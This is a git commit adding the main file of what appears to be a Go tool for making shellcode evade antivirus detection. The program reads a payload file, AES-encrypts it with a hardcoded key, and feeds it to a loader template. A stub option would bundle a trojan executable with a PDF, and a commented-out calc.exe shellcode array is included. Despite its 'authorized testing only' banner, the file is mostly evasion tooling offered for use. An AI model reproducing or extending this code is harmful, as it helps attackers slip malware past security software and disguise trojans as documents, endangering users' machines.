9cc8fda5f35fb6295fa9d190cab7d1cf6950fe60
Arks7 <82130343+Arks7@users.noreply.github.com>
2023-01-05 10:40:22 +0800

    Create main.go

---
+++ main.go
@@ -0,0 +1,101 @@
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"nvm/In"
+	"nvm/in/wins"
+)
+
+var (
+	path          = "payload.bin"
+	enmode        = "AES"
+	aeskey        = "happy@2022072700"
+	tplname       = "1"
+	xid       int = 1
+	mfilename     = "Muma.exe"
+	filename      = "1.pdf"
+	//shellcode     = []byte{
+	//	//	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
+	//	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
+	//	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
+	//	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
+	//	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
+	//	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
+	//	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
+	//	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
+	//	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
+	//	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
+	//	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
+	//	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
+	//	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
+	//	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
+	//	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
+	//	0xd7,
+	//}
+)
+
+const Banner = ` 
+     ██     ██     ██████    ██              ██████                                             
+    ████   ░██    ░░░░░░█   █░█             ░█░░░░██   ██   ██ ██████                           
+   ██░░██  ░██  ██     ░█  █ ░█             ░█   ░██  ░░██ ██ ░██░░░██  ██████    ██████  ██████
+  ██  ░░██ ░██ ██      █  ██████            ░██████    ░░███  ░██  ░██ ░░░░░░██  ██░░░░  ██░░░░ 
+ ██████████░████      █  ░░░░░█             ░█░░░░ ██   ░██   ░██████   ███████ ░░█████ ░░█████ 
+░██░░░░░░██░██░██    █       ░█             ░█    ░██   ██    ░██░░░   ██░░░░██  ░░░░░██ ░░░░░██
+░██     ░██░██░░██  █        ░█  █████ █████░███████   ██     ░██     ░░████████ ██████  ██████ 
+░░      ░░ ░░  ░░  ░         ░  ░░░░░ ░░░░░ ░░░░░░░   ░░      ░░       ░░░░░░░░ ░░░░░░  ░░░░░░
+Ver 1.0
+[INFO]仅用于授权测试，严禁违法行为！
+
+-h 查看帮助
+`
+
+func main() {
+	fmt.Println(Banner)
+	fmt.Println("[+]请选择服务项目 [默认免杀 1=免杀]")
+	fmt.Scanln(&xid)
+
+	if xid == 1 {
+		fmt.Println("[+]请输入shellocde地址 [默认./payload.bin]")
+		fmt.Scanln(&path)
+		sc, err := ioutil.ReadFile(path)
+		if err != nil || len(sc) == 0 {
+			fmt.Println("[-]请检查输入的路径!")
+			return
+		}
+		fmt.Println("[+]请输入免杀模板 [默认1，后期在加]")
+		fmt.Scanln(&tplname)
+		fmt.Println("[+]请输入加密方式 [默认AES，后期在加]")
+		fmt.Scanln(&enmode)
+		if enmode == "AES" {
+			fmt.Println("[+]加密方式 [默认AES，其他也没撒必要]")
+			fmt.Println("开始制作------------------------->")
+			Aes_go(sc, tplname)
+
+		}
+	} else if xid == 2 {
+		fmt.Println("[+]请输入Muma文件路径  [默认当前路径下 Muma.exe]")
+		fmt.Scanln(&mfilename)
+		fmt.Println("[+]请输入需要处理的文件 [默认当前路径下 1.pdf]")
+		fmt.Scanln(&filename)
+
+	}
+
+}
+
+////读取文件内容
+//func ReadFile(filename *string) []byte {
+//	str := *filename
+//	f, _ := ioutil.ReadFile(str)
+//	return f
+//}
+
+func Aes_go(sc []byte, tmpmode string) {
+
+	// 加密
+	shellsrc := wins.Bagua_en(sc)
+
+	//执行模板操作，参数1 加密内容 参数2 密钥 参数3 加密类型 参数4 模板
+	In.Tpl_go(shellsrc, tmpmode)
+
+}
